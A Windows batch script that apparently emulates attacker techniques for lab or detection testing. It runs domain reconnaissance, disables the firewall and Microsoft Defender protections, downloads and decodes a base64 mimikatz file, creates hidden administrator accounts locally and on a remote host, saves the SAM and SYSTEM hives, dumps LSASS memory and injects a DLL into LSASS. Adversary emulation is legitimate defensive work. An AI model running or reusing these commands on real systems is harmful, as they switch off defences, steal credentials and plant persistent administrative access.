@echo off

cd %appdata%

rem **Recon
net user /domain >>%appdata%\hostinfo.txt
net use /domain >>%appdata%\hostinfo.txt
net group /domain >>%appdata%\hostinfo.txt
net group "Domain Admins" /domain >>%appdata%\hostinfo.txt
net group "Enterprise Admins" /domain >>%appdata%\hostinfo.txt
WMIC /OUTPUT:"%appdata%\hostinfoAV.txt" Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName 

netsh advfirewall set allprofiles state off
powershell.exe Add-MpPreference -ExclusionPath “%appdata%”
copy \Windows\System32\WindowsPowerShell\v1.0\powershell.exe %appdata%\powershell.exe
copy \Windows\System32\cmd.exe %appdata%\cmd.exe
copy /B powershell.exe + cmd.exe chrome.exe
chrome.exe Set-ExecutionPolicy unrestricted
chrome.exe Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -SubmitSamplesConsent NeverSend
chrome.exe -Command "(New-Object Net.WebClient).DownloadString(https://github.com/threatspeak/lab/blob/5bfb6a9429b04b39efa5f2259372e626b12489d8/New_Invoice.docm') Out-File New_Invoice.docx
TIMEOUT /T 3
chrome.exe -Command "(New-Object Net.WebClient).DownloadString('https://github.com/threatspeak/lab/blob/55ed60d980e73102c3f2b32dac87082d098e7d7a/mimikatz.b64') | Out-File mimikatz.b64"
TIMEOUT /T 3
certutil.exe -decode .\mimikatz.b64 mimikatz.exe


rem **User Account Creation
net user admin1 123ABC456xyz /ADD
wmic useraccount where name='admin1' set passwordexpires=false
net localgroup administrators admin1 /add
wmic /node:PALITTO.NET process call create "net user /add InsertedUser pa$$w0rd1"
PsExec.exe \\PALITTO.NET -accepteula net localgroup "Administrators" InsertedUser /add

rem **Dump HIV System and 
reg save HKLM\SAM SamBkup.hiv
reg save HKLM\SYSTEM SystemBkup.hiv 

timeout /t 20 /nobreak

powershell.exe -NoProfile -Command "rundll32.exe %windir%\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) %windir%\Temp\lsass.dmp full"
TIMEOUT /T 3
dir %windir%\Temp\lsass.dmp
del %windir%\Temp\lsass.dmp

copy %windir%\System32\WindowsPowerShell\v1.0\powershell.exe %windir%\Temp\notepad.exe
%windir%\Temp\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
TIMEOUT /T 3
del %windir%\Temp\notepad.exe

schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > %windir%\Temp\current_date.txt"
TIMEOUT /T 3
schtasks /Query /TN CMDTestTask
schtasks /Delete /TN CMDTestTask /F

powershell.exe -NoProfile -Command "mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING %windir%\System32\vbscript.dll"
TIMEOUT /T 3
powershell.exe -NoProfile -Command "(ps lsass).Modules | Where-Object { $_.ModuleName -eq 'vbscript.dll' }"

powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
TIMEOUT /T 3

%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
TIMEOUT /T 3
dir hello.txt
del hello.txt

powershell -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt"
TIMEOUT /T 3
dir LICENSE.txt
del LICENSE.txt

rundll32.exe pcwutl.dll,LaunchApplication %windir%\System32\notepad.exe
TIMEOUT /T 3

sc create CMDTestService type=own binPath="cmd /c date /T > %windir%\Temp\current_date.txt"
TIMEOUT /T 3
sc query CMDTestService
sc delete CMDTestService

powershell -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt"

:no
echo Exiting

